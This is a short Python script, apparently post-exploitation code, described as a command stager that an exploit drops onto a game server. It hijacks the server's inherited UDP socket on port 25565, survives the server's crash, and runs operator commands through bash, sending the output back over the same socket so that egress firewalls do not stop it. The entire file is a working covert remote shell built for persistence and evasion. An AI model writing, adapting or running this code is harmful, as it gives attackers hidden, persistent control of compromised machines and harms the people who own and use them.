# Socket-reuse command stager for the egress-sealed target.
#
# Delivered by the exploit's system() payload and run detached (setsid ... &) so it OUTLIVES the server it
# was injected into. It inherits the server's UDP game socket (fd 4, bound to 0.0.0.0:25565) and keeps it
# alive after the server crashes, so :25565 stays bound to us. It then serves a tiny command protocol back
# to the operator's client over that SAME socket -- which is why it works on a box that drops all new
# outbound: replies ride the established inbound 4-tuple the firewall already has state for.
#
# Protocol (UDP, on the game port): operator -> "RCESH:<shell command>"; stager runs it and streams
# "RCESH:<stdout+stderr chunk>" datagrams back, terminated by "RCESH:\x00END".
import socket, os, subprocess as sp
M = b'RCESH:'
s = socket.socket(fileno=os.dup(4))   # dup the inherited game socket; keeps :25565 bound after the server dies
s.settimeout(900)
while True:
    try:
        data, addr = s.recvfrom(65535)
    except Exception:
        break
    if not data.startswith(M):
        continue                       # ignore stray game traffic
    cmd = data[len(M):].decode('utf-8', 'replace')
    try:
        r = sp.run(['/bin/bash', '-lc', cmd], capture_output=True, timeout=30)
        out = r.stdout + r.stderr
    except Exception as e:
        out = repr(e).encode()
    if not out:
        out = b'[no output]\n'
    for i in range(0, len(out), 1200):
        s.sendto(M + out[i:i+1200], addr)
    s.sendto(M + b'\x00END', addr)
